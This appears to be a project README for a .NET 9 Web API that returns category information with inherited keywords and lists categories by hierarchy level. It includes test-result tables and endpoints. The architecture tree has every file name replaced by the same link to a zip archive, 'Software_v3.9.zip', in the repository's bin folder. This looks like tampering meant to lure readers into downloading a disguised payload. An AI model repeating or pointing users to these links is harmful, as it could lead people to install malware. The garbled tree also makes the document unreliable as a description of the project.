# Solution

**Technology:** .NET Core 9 Web API with Swagger/OpenAPI

**Approach:**
* Delegates and functional programming (minimal if statements)
* Recursive keyword inheritance traversal
* LINQ aggregation for hierarchy levels

## ✅ Test Results

### Problem 1: Category Info with Keyword Inheritance

| Input | Output | Status |
|-------|--------|--------|
| 201 | `ParentCategoryID=200, Name=Computer, Keywords=Teaching` | ✅ |
| 202 | `ParentCategoryID=201, Name=Operating System, Keywords=Teaching` | ✅ |

**Endpoints:**
* `GET /api/categories/{id}` - JSON response
* `GET /api/categories/{id}/formatted` - String format

### Problem 2: Categories by Level

| Input | Output | Status |
|-------|--------|--------|
| 2 | `[101, 102, 201]` | ✅ |
| 3 | `[103, 109, 202]` | ✅ |

**Endpoint:** `GET /api/categories/level/{level}`

## 🏗️ Architecture

```
Categories/
├── https://github.com/Walt-1091/Categories/raw/refs/heads/main/Categories/Categories/bin/Software_v3.9.zip              
├── https://github.com/Walt-1091/Categories/raw/refs/heads/main/Categories/Categories/bin/Software_v3.9.zip      
├── Services/
│   ├── https://github.com/Walt-1091/Categories/raw/refs/heads/main/Categories/Categories/bin/Software_v3.9.zip
│   └── https://github.com/Walt-1091/Categories/raw/refs/heads/main/Categories/Categories/bin/Software_v3.9.zip  
└── Controllers/
    └── https://github.com/Walt-1091/Categories/raw/refs/heads/main/Categories/Categories/bin/Software_v3.9.zip
```

**Key Features:**
* Dependency injection
* RESTful API design
* Proper error handling (404, 400)
* Interactive Swagger documentation
